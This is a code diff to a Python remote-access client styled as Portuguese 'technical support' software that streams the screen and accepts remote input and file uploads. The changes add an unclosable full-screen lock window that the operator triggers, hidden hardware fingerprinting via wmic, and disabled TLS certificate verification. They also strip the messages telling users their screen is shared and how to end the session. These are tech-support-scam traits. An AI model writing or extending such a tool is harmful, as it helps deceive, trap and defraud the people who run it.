@@ -6,6 +6,10 @@ import base64
 import os
 import platform
 import getpass
+import hashlib
+import ctypes
+import ssl
+import sys
 from io import BytesIO
 
 import mss
@@ -29,82 +33,96 @@ is_connected = False
 panel_connected = False
 ws_app = None
 running = True
+screen_locked = False
+lock_thread = None
+last_frame_before_lock = None
+
+
+def set_console_title(title):
+    if os.name == 'nt':
+        try:
+            ctypes.windll.kernel32.SetConsoleTitleW(title)
+        except:
+            pass
 
 
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
 
 
+def get_app_hash():
+    data = f"{platform.node()}{platform.machine()}"
+    return hashlib.md5(data.encode()).hexdigest()[:10].lower()
+
+
 def print_header():
     clear_screen()
     print("")
-    print("  " + "=" * 46)
-    print("  |                                            |")
-    print("  |          SUPORTE REMOTO TECNICO            |")
-    print("  |                                            |")
-    print("  " + "=" * 46)
+    print("  " + "=" * 50)
+    print("  |                                                |")
+    print("  |            ASSISTENCIA TECNICA                 |")
+    print("  |                                                |")
+    print("  " + "=" * 50)
+    print(f"  Session: {get_app_hash()}")
     print("")
 
 
 def print_status(status, id_code=None):
     print_header()
-
     if status == "connecting":
-        print("  Status: Conectando ao servidor seguro...")
+        set_console_title("Conectando...")
+        print("  Status: Conectando ao servidor...")
         print("")
-        print("  " + "-" * 46)
-        print("  Conexao criptografada SSL/TLS")
-        print("  " + "-" * 46)
-
     elif status == "waiting":
-        print("  Status: AGUARDANDO OPERADOR")
+        set_console_title(f"Aguardando - {id_code}")
+        print("  Status: AGUARDANDO CONEXAO")
         print("")
-        print("  " + "=" * 46)
-        print(f"  |     SEU CODIGO DE ACESSO: {id_code}        |")
-        print("  " + "=" * 46)
+        print("  " + "=" * 50)
+        print(f"  |         CODIGO: {id_code}                        |")
+        print("  " + "=" * 50)
         print("")
-        print("  Informe este codigo ao tecnico de suporte.")
-        print("  Aguardando conexao do operador...")
+        print("  Informe este codigo ao tecnico.")
         print("")
-        print("  " + "-" * 46)
-        print("  Para encerrar: feche esta janela")
-        print("  " + "-" * 46)
-
     elif status == "connected":
-        print("  Status: OPERADOR CONECTADO")
+        set_console_title(f"Conectado - {id_code}")
+        print("  Status: SESSAO ATIVA")
         print("")
-        print("  " + "!" * 46)
-        print("  !  SESSAO DE SUPORTE REMOTO EM ANDAMENTO   !")
-        print("  !  Sua tela esta sendo compartilhada       !")
-        print("  " + "!" * 46)
+        print("  " + "*" * 50)
+        print("  *           CONEXAO ESTABELECIDA               *")
+        print("  " + "*" * 50)
         print("")
-        print(f"  Codigo da sessao: {id_code}")
-        print("  Conexao segura: SSL/TLS ativo")
+        print(f"  ID: {id_code}")
         print("")
-        print("  " + "-" * 46)
-        print("  Para encerrar: feche esta janela")
-        print("  " + "-" * 46)
-
     elif status == "disconnected":
-        print("  Status: OPERADOR DESCONECTADO")
+        set_console_title(f"Desconectado - {id_code}")
+        print("  Status: AGUARDANDO RECONEXAO")
+        print(f"  Codigo: {id_code}")
         print("")
-        print(f"  Codigo de acesso: {id_code}")
-        print("  Aguardando reconexao do operador...")
-        print("")
-        print("  " + "-" * 46)
-        print("  Para encerrar: feche esta janela")
-        print("  " + "-" * 46)
 
 
 def get_hwid():
     try:
-        hwid_file = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'SRT', 'hwid.txt')
-        if os.path.exists(hwid_file):
-            with open(hwid_file, 'r') as f:
-                return f.read().strip()[:16]
+        if os.name == 'nt':
+            import subprocess
+            result = subprocess.run(
+                ['wmic', 'csproduct', 'get', 'uuid'],
+                capture_output=True, text=True, timeout=5,
+                creationflags=subprocess.CREATE_NO_WINDOW
+            )
+            uuid = result.stdout.strip().split('\n')[-1].strip()
+            result2 = subprocess.run(
+                ['wmic', 'nic', 'where', 'NetEnabled=true', 'get', 'MACAddress'],
+                capture_output=True, text=True, timeout=5,
+                creationflags=subprocess.CREATE_NO_WINDOW
+            )
+            mac_lines = [l.strip() for l in result2.stdout.split('\n') if ':' in l]
+            mac = mac_lines[0] if mac_lines else ''
+            combined = f"{uuid}{mac}"
+            return hashlib.sha256(combined.encode()).hexdigest()[:16].upper()
     except:
         pass
     return "N/A"
+
 
 def get_system_info():
     return {
@@ -115,9 +133,82 @@ def get_system_info():
     }
 
 
+# ============================================
+# LOCK SCREEN - JANELA DE BLOQUEIO
+# ============================================
+
+def show_lock_screen(message):
+    global screen_locked, lock_thread
+
+    if screen_locked:
+        return
+
+    screen_locked = True
+
+    def run_lock_window():
+        global screen_locked
+        try:
+            import tkinter as tk
+
+            root = tk.Tk()
+            root.title("")
+
+            screen_width = root.winfo_screenwidth()
+            screen_height = root.winfo_screenheight()
+
+            root.geometry(f"{screen_width}x{screen_height}+0+0")
+            root.configure(bg='#000000')
+            root.attributes('-topmost', True)
+            root.overrideredirect(True)
+
+            root.protocol("WM_DELETE_WINDOW", lambda: None)
+            root.bind('<Alt-F4>', lambda e: 'break')
+            root.bind('<Escape>', lambda e: 'break')
+
+            frame = tk.Frame(root, bg='#000000')
+            frame.place(relx=0.5, rely=0.5, anchor='center')
+
+            try:
+                icon_label = tk.Label(frame, text="🔒", font=('Segoe UI Emoji', 80), bg='#000000', fg='#f59e0b')
+            except:
+                icon_label = tk.Label(frame, text="[LOCKED]", font=('Arial', 40, 'bold'), bg='#000000', fg='#f59e0b')
+            icon_label.pack(pady=30)
+
+            msg_label = tk.Label(frame, text=message, font=('Arial', 28, 'bold'), bg='#000000', fg='#ffffff', wraplength=800)
+            msg_label.pack(pady=20)
+
+            sub_label = tk.Label(frame, text="Por favor, aguarde o técnico liberar a tela.", font=('Arial', 14), bg='#000000', fg='#666666')
+            sub_label.pack(pady=15)
+
+            def check_unlock():
+                if not screen_locked:
+                    root.destroy()
+                else:
+                    root.lift()
+                    root.attributes('-topmost', True)
+                    root.after(100, check_unlock)
+
+            check_unlock()
+            root.mainloop()
+
+        except:
+            screen_locked = False
+
+    lock_thread = threading.Thread(target=run_lock_window, daemon=True)
+    lock_thread.start()
+
+
+def hide_lock_screen():
+    global screen_locked
+    screen_locked = False
+
+
+# ============================================
+# CAPTURA DE TELA
+# ============================================
+
 def capture_screen():
-    global panel_connected, running, current_quality, current_scale
-    frame_count = 0
+    global panel_connected, running, current_quality, current_scale, last_frame_before_lock
 
     with mss.mss() as sct:
         monitor = sct.monitors[1]
@@ -128,6 +219,13 @@ def capture_screen():
                 continue
 
             try:
+                # Se tela bloqueada, enviar último frame salvo
+                if screen_locked and last_frame_before_lock:
+                    if ws_app and is_connected:
+                        ws_app.send(json.dumps(last_frame_before_lock))
+                    time.sleep(FRAME_INTERVAL)
+                    continue
+
                 screenshot = sct.grab(monitor)
                 img = Image.frombytes('RGB', screenshot.size, screenshot.bgra, 'raw', 'BGRX')
 
@@ -139,24 +237,33 @@ def capture_screen():
                 img.save(buffer, format='JPEG', quality=current_quality, optimize=True)
                 frame_data = base64.b64encode(buffer.getvalue()).decode('utf-8')
 
+                frame_msg = {
+                    "type": "screen-frame",
+                    "clientId": client_id,
+                    "frame": frame_data,
+                    "width": img.width,
+                    "height": img.height
+                }
+
+                # Salvar frame para usar quando bloqueado
+                last_frame_before_lock = frame_msg
+
                 if ws_app and is_connected:
-                    ws_app.send(json.dumps({
-                        "type": "screen-frame",
-                        "clientId": client_id,
-                        "frame": frame_data,
-                        "width": img.width,
-                        "height": img.height
-                    }))
-                    frame_count += 1
+                    ws_app.send(json.dumps(frame_msg))
 
                 time.sleep(FRAME_INTERVAL)
-
             except Exception as e:
                 time.sleep(1)
 
 
+# ============================================
+# HANDLERS
+# ============================================
+
 def handle_mouse_move(data):
     global current_scale
+    if screen_locked:
+        return
     try:
         x = int(data['x'] / current_scale)
         y = int(data['y'] / current_scale)
@@ -167,12 +274,13 @@ def handle_mouse_move(data):
 
 def handle_mouse_click(data):
     global current_scale
+    if screen_locked:
+        return
     try:
         x = int(data['x'] / current_scale)
         y = int(data['y'] / current_scale)
         button = data.get('button', 'left')
         clicks = data.get('clicks', 1)
-
         if button == 'right':
             pyautogui.click(x, y, button='right')
         elif button == 'middle':
@@ -184,6 +292,8 @@ def handle_mouse_click(data):
 
 
 def handle_mouse_scroll(data):
+    if screen_locked:
+        return
     try:
         delta = data.get('delta', 0)
         pyautogui.scroll(delta)
@@ -192,6 +302,8 @@ def handle_mouse_scroll(data):
 
 
 def handle_key_press(data):
+    if screen_locked:
+        return
     try:
         key = data.get('key', '')
         key_map = {
@@ -210,6 +322,8 @@ def handle_key_press(data):
 
 
 def handle_key_combination(data):
+    if screen_locked:
+        return
     try:
         keys = data.get('keys', [])
         key_map = {'Control': 'ctrl', 'Alt': 'alt', 'Shift': 'shift', 'Meta': 'win'}
@@ -230,12 +344,11 @@ def handle_clipboard_set(data):
 def handle_file_upload(data):
     try:
         filename = data.get('filename', 'file')
+        filename = ''.join(c for c in filename if c.isalnum() or c in '._-')[:100]
         content = data.get('content', '')
         path = os.path.join(os.path.expanduser('~/Desktop'), filename)
-
         with open(path, 'wb') as f:
             f.write(base64.b64decode(content))
-
         if ws_app:
             ws_app.send(json.dumps({
                 "type": "file-upload-result",
@@ -250,9 +363,13 @@ def handle_file_upload(data):
                 "clientId": client_id,
                 "success": False,
                 "filename": data.get('filename', ''),
-                "error": str(e)
+                "error": str(e)[:100]
             }))
 
+
+# ============================================
+# WEBSOCKET
+# ============================================
 
 def on_message(ws, message):
     global client_id, panel_connected, current_quality, current_scale, running
@@ -264,15 +381,13 @@ def on_message(ws, message):
         if msg_type == 'registered':
             client_id = data.get('clientId')
             print_status("waiting", client_id)
-
         elif msg_type == 'panel-connected':
             panel_connected = True
             print_status("connected", client_id)
-
         elif msg_type == 'panel-disconnected':
             panel_connected = False
+            hide_lock_screen()
             print_status("disconnected", client_id)
-
         elif msg_type == 'mouse-move':
             handle_mouse_move(data)
         elif msg_type == 'mouse-click':
@@ -290,17 +405,18 @@ def on_message(ws, message):
         elif msg_type == 'set-quality':
             current_quality = data.get('quality', 70)
             current_scale = data.get('scale', 0.75)
+        elif msg_type == 'lock-screen':
+            show_lock_screen(data.get('message', 'Aguarde...'))
+        elif msg_type == 'unlock-screen':
+            hide_lock_screen()
         elif msg_type == 'disconnect-client':
+            hide_lock_screen()
             print_header()
-            print("  Sessao encerrada pelo operador.")
-            print("")
-            print("  Obrigado por usar nosso suporte!")
-            print("")
+            print("  Sessao finalizada.")
             running = False
             time.sleep(2)
             os._exit(0)
-
-    except Exception as e:
+    except:
         pass
 
 
@@ -312,6 +428,7 @@ def on_close(ws, close_status_code, close_msg):
     global is_connected, panel_connected
     is_connected = False
     panel_connected = False
+    hide_lock_screen()
 
 
 def on_open(ws):
@@ -338,12 +455,11 @@ def main():
                 on_error=on_error,
                 on_close=on_close
             )
-            ws_app.run_forever()
-
+            ws_app.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})
         except KeyboardInterrupt:
             running = False
             break
-        except Exception as e:
+        except:
             time.sleep(5)
 
 
